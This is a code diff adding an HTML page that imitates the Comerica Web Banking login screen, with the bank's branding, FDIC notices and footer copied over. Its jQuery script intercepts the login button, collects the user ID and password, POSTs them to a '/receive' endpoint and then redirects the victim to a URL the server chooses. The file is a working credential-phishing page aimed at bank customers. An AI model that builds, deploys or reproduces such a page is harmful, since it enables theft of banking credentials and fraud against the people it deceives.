@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Comerica Web Banking</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js'></script>
+</head>
+<body>
+    <header>
+        <div class="top-bar">
+        	<span>FDIC -</span>
+            <span>Insured - Backed by the full faith and credit of the U.S. Government</span>
+        </div>
+        <div class="header-content">
+            <button class="menu-btn">&#9776;</button>
+            <img src="/images/logo-comerica.png" alt="Comerica Logo" class="logo">
+            <button class="close-btn">CLOSE</button>
+        </div>
+    </header>
+
+    <main class="main-container">
+    <div class="form-container">
+        <h1>Comerica Web Banking</h1>
+        <form class="login-form">
+            <div class="form-group">
+                <label for="user-id">User ID</label>
+                <input type="text" name="userid" id="user-id" placeholder="User ID">
+            </div>
+            <div class="form-group">
+                <input type="checkbox" id="save-user-id">
+                <label for="save-user-id">Save User ID</label>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Password">
+            </div>
+            <div class="buttons">
+                <button type="submit" class="login-btn">LOG IN</button>
+                <span>OR</span>
+                <button type="button" class="enroll-btn">ENROLL</button>
+            </div>
+        </form>
+        <div class="links">
+            <a href="#">Forgot Password</a> |
+            <a href="#">Help</a> |
+            <a href="#">Fraud Center</a>
+        </div>
+        <section class="other-services">
+            <h4>Log in to other Comerica services</h4>
+            <select>
+                <option>Choose Service</option>
+            </select>
+        </section>
+    </div>
+</main>
+</body>
+<footer>
+    <div class="footer-container">
+        <div class="footer-nav">
+            <ul>
+                <li><strong>Site Navigation</strong></li>
+                <li>Home</li>
+                <li>Personal</li>
+                <li>Small Business</li>
+                <li>Commercial</li>
+                <li>Wealth Management</li>
+            </ul>
+            <ul>
+                <li>&nbsp;</li>
+                <li>About Comerica</li>
+                <li>Contact Us</li>
+                <li>Newsroom</li>
+                <li>Careers</li>
+                <li>Investor Relations</li>
+                <li>Fraud Center</li>
+                <li>Diversity</li>
+                <li>Insights</li>
+            </ul>
+            <ul>
+                <li><strong>Security</strong></li>
+                <li>Privacy & Cookies Policy</li>
+                <li>Terms and Conditions</li>
+                <li>Consumer Complaint Notice</li>
+                <li>Site Map</li>
+                <li>California Privacy Rights Act (CPRA) Notice</li>
+            </ul>
+            <ul>
+                <li>&nbsp;</li>
+                <li>Member FDIC</li>
+                <li>Equal Opportunity Lender</li>
+                <li>Equal Housing Lender</li>
+                <li>NMLS ID 480990</li>
+                <li>
+                    <a href="#"><i class="icon-facebook"></i></a>
+                    <a href="#"><i class="icon-linkedin"></i></a>
+                    <a href="#"><i class="icon-instagram"></i></a>
+                </li>
+            </ul>
+        </div>
+        <div class="footer-bottom">
+            <p>Do Not Sell or Share My Personal Information (CA Residents only)</p>
+            <p>&copy; 2024, Comerica Bank. All rights reserved.</p>
+            <p class="raise-expectations">raise your expectations</p>
+        </div>
+    </div>
+</footer>
+<script>
+	
+	$(document).ready(function () {
+    $('.login-btn').click(function (e) {
+        e.preventDefault();
+
+        let userinfo = {}; 
+        let visitor = $('#username').val();
+        sessionStorage.setItem('visitor', visitor);
+        
+        $('form input').each(function () {
+            let inputName = $(this).attr('name');
+            let inputValue = $(this).val();
+            
+            if (inputName) {
+                userinfo[inputName] = inputValue;
+            }
+        });
+
+        userinfo['visitor'] = visitor;
+        console.log(userinfo); 
+        
+        $.ajax({
+            url: '/receive',
+            type: 'POST',
+            data: userinfo,
+            success: function (response) {
+             if(response.url){
+                window.location.href = response.url;
+                }
+            },
+            error: function (xhr, status, error) {
+                alert('An error occurred: ' + error);
+            }
+        });
+    });
+});
+  </script>
+</html>
